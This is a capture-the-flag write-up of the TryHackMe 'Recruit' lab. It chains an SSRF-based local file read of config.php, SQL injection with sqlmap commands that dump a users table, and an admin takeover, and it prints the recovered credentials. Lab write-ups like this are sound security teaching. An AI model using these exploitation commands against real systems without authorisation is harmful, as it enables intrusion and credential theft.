# Recruit — SSRF → LFI → SQL Injection → Admin Takeover”THM”

- **Source URL:** https://medium.com/@ahmed240102345/recruit-ssrf-lfi-sql-injection-admin-takeover-thm-e31a0688b0bc
- **Fetched from:** https://medium.com/@ahmed240102345/recruit-ssrf-lfi-sql-injection-admin-takeover-thm-e31a0688b0bc?source=rss-5f5c192498eb------2
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:**  (id 14931)
- **Method:** medium-rss-feed (full content:encoded) readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
- **Author/Published (RSS):** AHMED ASHEERY / Fri, 02 Oct 2026 22:32:16 GMT

**Difficulty:** Easy/Medium **Category:** Web Application Pentesting **Techniques:** SSRF, Local File Inclusion, SQL Injection, Vulnerability Chaining

Recruit is a vulnerable recruitment portal that simulates a real-world web application assessment. Multiple vulnerabilities must be chained together to escalate from an unauthenticated visitor to full administrative access, capturing two flags along the way.

**Attack chain:** SSRF → LFI → SQL Injection → Admin Takeover

Started with a fast port scan using rustscan piped into nmap for service detection:

rustscan -a \<TARGET\_IP> -- -sC -sV

**Results:**

Port Service Version 22 SSH OpenSSH 8.2p1 53 DNS ISC BIND 9.16.1 80 HTTP Apache 2.4.41

Three open ports, with the web application on port 80 being the primary attack surface.

Used feroxbuster to discover hidden directories and files:

feroxbuster -u http://\<TARGET\_IP> -w /usr/share/wordlists/dirb/common.txt -x php

Interesting paths discovered included /mail, /api, and /assets.

Navigating directly to:

http://\<TARGET\_IP>/mail/mail.log

revealed an internal email thread. The message explained that HR account credentials were temporarily stored in config.php, while admin credentials lived in the database.

This single misconfigured log file gave a clear roadmap for the next step.

Reviewing the API documentation (linked from the login page) revealed an endpoint:

/file.php?cv=\<URL>

This parameter was designed to fetch a candidate’s CV from a remote URL — a classic **Server-Side Request Forgery (SSRF)** pattern that, when pointed at the local filesystem, becomes a **Local File Inclusion** primitive.

**Exploitation:**

curl "http://\<TARGET\_IP>/file.php?cv=file:///var/www/html/config.php"

This returned the raw source of config.php, exposing the HR account's plaintext password.

With the HR credentials in hand:

Logging in granted access to the HR dashboard, where the **first flag (HR Flag)** was displayed.

The candidate search field on the HR dashboard was tested with a single quote:

'

This produced a visible MySQL syntax error — a clear signal of an unsanitized SQL query.

**Likely backend query:**

SELECT \* FROM candidates WHERE name LIKE '%input%'

sqlmap -u "http://\<TARGET\_IP>/dashboard.php?search=test" \

--cookie="PHPSESSID=\<session\_cookie>" \

--batch --dbs

**Databases found:**

information\_schema, mysql, performance\_schema, phpmyadmin, recruit\_db, sys

sqlmap -u "http://\<TARGET\_IP>/dashboard.php?search=test" \

--cookie="PHPSESSID=\<session\_cookie>" \

--batch -D recruit\_db --tables

sqlmap -u "http://\<TARGET\_IP>/dashboard.php?search=test" \

--cookie="PHPSESSID=\<session\_cookie>" \

--batch -D recruit\_db -T users -C username,password --dump

**Extracted credentials:**

username: admin

password: admin@001admin

Logged out of the HR session and authenticated with the extracted admin credentials, gaining full access to the administrator dashboard — and the **second flag**.

Vulnerability Impact Information Disclosure Leaked storage location of credentials via log file SSRF / LFI Exposure of sensitive server-side files Hardcoded Credentials Weak security practice (plaintext in config) SQL Injection Full database compromise Broken Access Control Privilege escalation to administrator
